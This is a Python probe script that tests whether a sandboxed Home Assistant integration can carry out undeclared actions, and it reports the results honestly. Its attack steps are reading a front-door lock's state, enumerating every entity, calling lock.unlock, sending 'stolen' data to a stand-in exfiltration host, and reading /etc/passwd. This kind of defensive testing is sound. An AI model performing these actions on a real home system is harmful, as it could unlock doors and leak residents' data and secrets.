"""Adversarial probe: what a malicious version of this integration would try.

Runs inside the sandbox after the real integration has set up successfully, over
the same manifest and the same bridge. Nothing here is exotic — each of these is
a single line an integration author could add to a legitimate integration, and
on stock Home Assistant every one of them succeeds today.

The last check is expected to FAIL to be blocked, and says so. The spike has
process separation and a mediated API; it does not yet have filesystem
isolation. Reporting that honestly is the point of running the probe at all.
"""

from __future__ import annotations

from homeassistant._bridge import PermissionDenied
from homeassistant.core import HomeAssistant
from homeassistant.helpers.aiohttp_client import async_get_clientsession

TARGET_LOCK = "lock.front_door"
EXFIL_HOST = "collector.exfil-example.net"
SECRETS_PATH = "/etc/passwd"  # stands in for /config/secrets.yaml on a real host


async def run_probe(hass: HomeAssistant) -> list[tuple[str, bool, str]]:
    """Attempt five undeclared actions; return (name, blocked, detail)."""
    results: list[tuple[str, bool, str]] = []
    print("\nsandbox: running adversarial probe", flush=True)

    # 1. Read one entity it never declared — occupancy, locks, cameras.
    try:
        state = hass.states.get(TARGET_LOCK)
        results.append(("read undeclared entity", False, f"got {state}"))
    except PermissionDenied as err:
        results.append(("read undeclared entity", True, str(err)))

    # 2. The firehose: ask for every state in the house at once.
    try:
        states = hass.states.async_all()
        leaked = [state.entity_id for state in states if not state.entity_id.startswith("sensor.andrews_arnold")]
        results.append(
            (
                "enumerate whole house",
                not leaked,
                f"{len(states)} returned, {len(leaked)} belonging to others",
            )
        )
    except PermissionDenied as err:
        results.append(("enumerate whole house", True, str(err)))

    # 3. Confused deputy: make the privileged side act on the attacker's behalf.
    try:
        await hass.services.async_call("lock", "unlock", {"entity_id": TARGET_LOCK})
        results.append(("call lock.unlock", False, "service call went through"))
    except PermissionDenied as err:
        results.append(("call lock.unlock", True, str(err)))

    # 4. Exfiltrate to a host that is not in the allowlist.
    session = async_get_clientsession(hass)
    try:
        await session.get(f"https://{EXFIL_HOST}/collect?data=stolen")
        results.append(("exfiltrate to undeclared host", False, "request was issued"))
    except PermissionDenied as err:
        results.append(("exfiltrate to undeclared host", True, str(err)))
    except Exception as err:  # noqa: BLE001 - DNS failure is not a security control
        results.append(("exfiltrate to undeclared host", False, f"allowed by policy, failed in transit: {type(err).__name__}"))

    # 5. Read a host file directly, bypassing the shim entirely.
    try:
        with open(SECRETS_PATH, encoding="utf-8") as handle:
            handle.readline()
        results.append(("read host filesystem", False, f"{SECRETS_PATH} readable — no fs isolation yet"))
    except OSError as err:
        results.append(("read host filesystem", True, str(err)))

    print("\nsandbox: probe results")
    for name, blocked, detail in results:
        mark = "BLOCKED" if blocked else "ALLOWED"
        print(f"  [{mark}] {name:<32} {detail}", flush=True)

    return results
